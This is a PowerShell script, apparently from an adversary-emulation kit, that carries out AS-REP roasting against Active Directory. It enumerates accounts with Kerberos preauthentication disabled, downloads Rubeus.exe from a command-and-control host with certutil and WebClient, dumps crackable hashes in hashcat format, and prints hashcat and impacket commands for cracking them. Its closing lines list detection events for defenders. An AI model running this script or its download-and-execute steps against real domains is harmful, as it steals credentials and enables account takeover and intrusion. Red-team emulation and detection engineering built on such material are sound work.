$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting Identity Attack - AS-REP Roasting..." -ForegroundColor Cyan

# T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting
# Finds accounts with "Do not require Kerberos preauthentication" 
# and requests AS-REP hashes for offline cracking
# Requires: Any authenticated domain user

Write-Host "[!] Requires: Any authenticated domain user" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Step 1: Enumerate accounts with PreAuth disabled via LDAP
Write-Host "`n[*] [T1087.002] Searching for accounts with Kerberos PreAuth disabled..." -ForegroundColor Yellow
Write-Host "    LDAP Filter: (userAccountControl:1.2.840.113556.1.4.803:=4194304)"

$asrepAccounts = @()

try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainDN = "DC=" + ($domain.Name -replace "\.", ",DC=")
    Write-Host "[+] Domain: $($domain.Name)" -ForegroundColor Green

    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domainDN")
    # UAC flag 0x400000 (4194304) = DONT_REQ_PREAUTH
    $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    $searcher.PropertiesToLoad.AddRange(@("samaccountname", "distinguishedname", "memberof", "pwdlastset"))
    $results = $searcher.FindAll()

    Write-Host "[+] Found $($results.Count) accounts with PreAuth disabled:" -ForegroundColor Green
    foreach ($result in $results) {
        $sam = $result.Properties["samaccountname"][0]
        $dn = $result.Properties["distinguishedname"][0]
        $pwdSet = [DateTime]::FromFileTime([Int64]$result.Properties["pwdlastset"][0])
        $groups = $result.Properties["memberof"]
        
        Write-Host "    [VULN] $sam" -ForegroundColor Red
        Write-Host "           DN: $dn" -ForegroundColor Gray
        Write-Host "           Password Set: $pwdSet" -ForegroundColor Gray
        
        $isPrivileged = $false
        foreach ($group in $groups) {
            if ($group -match "Domain Admins|Enterprise Admins|Administrators") {
                Write-Host "           [!] PRIVILEGED GROUP: $group" -ForegroundColor Red
                $isPrivileged = $true
            }
        }
        
        $asrepAccounts += $sam
    }
} catch {
    Write-Host "[-] LDAP enumeration failed: $_" -ForegroundColor Red
    
    # Fallback: PowerShell AD module
    Write-Host "[*] Trying Get-ADUser fallback..." -ForegroundColor Yellow
    Write-Host "    CMD: Get-ADUser -Filter {DoesNotRequirePreAuth -eq `$true}"
    try {
        Import-Module ActiveDirectory -ErrorAction Stop
        $adUsers = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,MemberOf,PasswordLastSet
        foreach ($user in $adUsers) {
            Write-Host "    [VULN] $($user.SamAccountName) (Password Set: $($user.PasswordLastSet))" -ForegroundColor Red
            $asrepAccounts += $user.SamAccountName
        }
    } catch {
        Write-Host "[-] AD module not available: $_" -ForegroundColor Red
    }
}

# Step 2: Request AS-REP hashes using Rubeus
Write-Host "`n[*] [T1105] Downloading Rubeus for AS-REP hash extraction..." -ForegroundColor Yellow
$rubeusPath = "$stagingDir\Rubeus.exe"
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/Rubeus.exe $rubeusPath"
certutil -urlcache -split -f "http://$C2Host/tools/Rubeus.exe" $rubeusPath

if (-not (Test-Path $rubeusPath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/Rubeus.exe", $rubeusPath)
    } catch {
        Write-Host "[-] Download failed." -ForegroundColor Red
    }
}

$hashOutput = "$stagingDir\asrep_hashes.txt"

if (Test-Path $rubeusPath) {
    Write-Host "[+] Rubeus staged successfully" -ForegroundColor Green

    # AS-REP roast all discovered accounts
    Write-Host "`n[*] [T1558.004] Requesting AS-REP hashes..." -ForegroundColor Yellow
    Write-Host "    CMD: Rubeus.exe asreproast /outfile:$hashOutput /format:hashcat"
    & $rubeusPath asreproast /outfile:$hashOutput /format:hashcat 2>&1

    if (Test-Path $hashOutput) {
        $hashCount = (Get-Content $hashOutput | Measure-Object).Count
        Write-Host "`n[+] AS-REP hashes saved: $hashOutput ($hashCount lines)" -ForegroundColor Green
        Write-Host "[!] Crack with: hashcat -m 18200 $hashOutput wordlist.txt" -ForegroundColor Yellow
    }

    # Also try individual users if bulk didn't work
    foreach ($account in $asrepAccounts) {
        Write-Host "`n[*] Individual AS-REP request for: $account" -ForegroundColor Yellow
        Write-Host "    CMD: Rubeus.exe asreproast /user:$account /format:hashcat"
        & $rubeusPath asreproast /user:$account /format:hashcat 2>&1
    }
} else {
    Write-Host "[-] Rubeus not available - manual AS-REP request not possible without tooling" -ForegroundColor Red
    Write-Host "[!] Ensure http://$C2Host/tools/Rubeus.exe is accessible" -ForegroundColor Yellow
    
    # Native enumeration summary
    if ($asrepAccounts.Count -gt 0) {
        Write-Host "`n[+] Vulnerable accounts identified for offline AS-REP roasting:" -ForegroundColor Green
        $asrepAccounts | ForEach-Object { Write-Host "    -> $_" -ForegroundColor Cyan }
        Write-Host "[!] Use impacket GetNPUsers.py from Kali to extract hashes" -ForegroundColor Yellow
        Write-Host "    CMD: GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile hashes.txt" -ForegroundColor Yellow
    }
}

Write-Host "`n[+] AS-REP Roasting Attack Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: AS-REQ without PreAuth (4768 with PreAuth type 0), Rubeus execution" -ForegroundColor Yellow
Write-Host "[!] Key Event ID: 4768 (Kerberos Authentication Ticket Requested) with RC4 encryption" -ForegroundColor Yellow
